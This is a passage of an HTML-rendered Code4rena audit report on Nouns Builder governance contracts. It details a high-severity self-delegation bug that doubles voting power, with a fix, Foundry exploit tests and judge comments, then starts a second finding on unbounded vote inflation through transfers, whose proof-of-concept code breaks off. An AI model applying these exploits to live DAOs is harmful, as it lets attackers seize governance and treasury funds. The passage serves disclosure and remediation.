href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L219-L232\"><code>ERC721Votes.sol#L220-L232</code></a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// If this isn&#39;t a token burn:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_to</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// Get the recipients&#39;s number of checkpoints</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">numCheckpoints</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">]++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// Used to store the recipient&#39;s previous voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// If this isn&#39;t the recipient&#39;s first checkpoint: Get their previous voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">checkpoints</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">][</span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">votes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// Update their voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk11\">_writeCheckpoint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\">, </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\">, </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span></code></pre>\n<p>The token owner’s voting power has now been increased by an amount equal to their total number of tokens, without an offsetting decrease.</p>\n<p>This exploit only works once: if a token owner subsequently delegates to themselves after their initial self delegation, <code>prevDelegate</code> will be set to a non-default value in <code>_delegate</code>, and the delegation logic will work as intended.</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Malicious <code>ERC21Votes</code> owners can accrue more voting power than they deserve. Especially malicious owners may quietly acquire multiple tokens before doubling their voting power. In an early DAO with a small supply of tokens, the impact of this exploit could be significant.</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Make the <code>delegates</code> function <code>public</code> rather than <code>external</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice The delegate for an account</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _account The account address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">delegates</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_account</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">current</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">delegation</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_account</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">current</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) ? </span><span class=\"mtk12\">_account</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">current</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Then, call this function rather than accessing the <code>delegation</code> mapping directly:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @dev Updates delegate addresses</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _from The address delegating votes from</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _to The address delegating votes to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_delegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Get the previous delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prevDelegate</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">delegates</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Store the new delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">delegation</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">DelegateChanged</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">prevDelegate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Transfer voting weight from the previous delegate to the new delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_moveDelegateVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">prevDelegate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Note that the original NounsDAO contracts follow this pattern. (See <a href=\"https://github.com/nounsDAO/nouns-monorepo/blob/master/packages/nouns-contracts/contracts/base/ERC721Checkpointable.sol#L83-L91\">here</a> and <a href=\"https://github.com/nounsDAO/nouns-monorepo/blob/master/packages/nouns-contracts/contracts/base/ERC721Checkpointable.sol#L83-L91\">here</a>).</p>\n<h3 id=\"test-cases\" style=\"position:relative;\"><a href=\"#test-cases\" aria-label=\"test cases permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Test cases</h3>\n<p>(Put the following test cases in <code>Gov.t.sol</code>)</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_delegate_to_self_doubles_voting_power</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">mintVoter1</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">delegate</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mintToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">createBid</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">0.420</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">auctionParams</span><span class=\"mtk1\">.</span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">seconds</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">settleCurrentAndCreateNewAuction</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_delegate_to_self_multiple_tokens_doubles_voting_power</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// An especially malicious user may acquire multiple tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// before doubling their voting power through this exploit.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">mintVoter1</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">mintToken</span><span class=\"mtk1\">(</span><span class=\"mtk7\">3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">mintToken</span><span class=\"mtk1\">(</span><span class=\"mtk7\">4</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">mintToken</span><span class=\"mtk1\">(</span><span class=\"mtk7\">5</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">mintToken</span><span class=\"mtk1\">(</span><span class=\"mtk7\">6</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">5</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">delegate</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">10</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/413#issuecomment-1258152894\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how, because of an incorrect assumption in reducing a non-existing previous delegate votes, through self-delegation, a user can double their voting power.</p>\n<p>Because the finding shows how the delegation system is broken, and because governance is a core aspect (Secure funds, move funds, etc..) I agree with High Severity.</p>\n<p>Due to multiple reports of this type, with various different attacks, mitigation is non-trivial.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/413\">kulkarohan (Nouns Builder) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/413#issuecomment-1261348244\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>In contrast to the dangerous overflow, this finding (and its duplicates) has shown how the Delegation Mechanism can be used to double the voting power.</p>\n<p>For that reason, the underlying issue being different, am choosing to leave this finding separate.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-05-_transferfrom-can-be-used-to-indefinitely-increase-voting-power\" style=\"position:relative;\"><a href=\"#h-05-_transferfrom-can-be-used-to-indefinitely-increase-voting-power\" aria-label=\"h 05 _transferfrom can be used to indefinitely increase voting power permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/224\">[H-05] <code>_transferFrom()</code> can be used to indefinitely increase voting power</a></h2>\n<p><em>Submitted by Soosh, also found by Ch_301, davidbrai, and PwnPatrol</em></p>\n<p>It is possible to indefinitely increase voting power by creating new accounts (addresses) and delegating. This will lead to unfair governance as a user can vote with more votes than actual.</p>\n<h3 id=\"explanation\" style=\"position:relative;\"><a href=\"#explanation\" aria-label=\"explanation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Explanation</h3>\n<p>The <code>_transferFrom()</code>  does not move delegates from the src’s delegates to the destination’s delegates, instead, it moves directly from src to dest. (see recommendations and Code POC for better understanding)</p>\n<h3 id=\"code-poc\" style=\"position:relative;\"><a href=\"#code-poc\" aria-label=\"code poc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code POC</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Insert this test case into Token.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Run: forge test --match-contract Token -vv</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;forge-std/console.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testIncreaseVotePower</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">deployMock</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voter2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voter1PK</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voter2PK</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Voter with 1 NFT voting power</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">voter1PK</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0xABC</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">voter1</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addr</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1PK</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Second account created by same voter</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">voter2PK</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0xABD</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">voter2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addr</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter2PK</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span 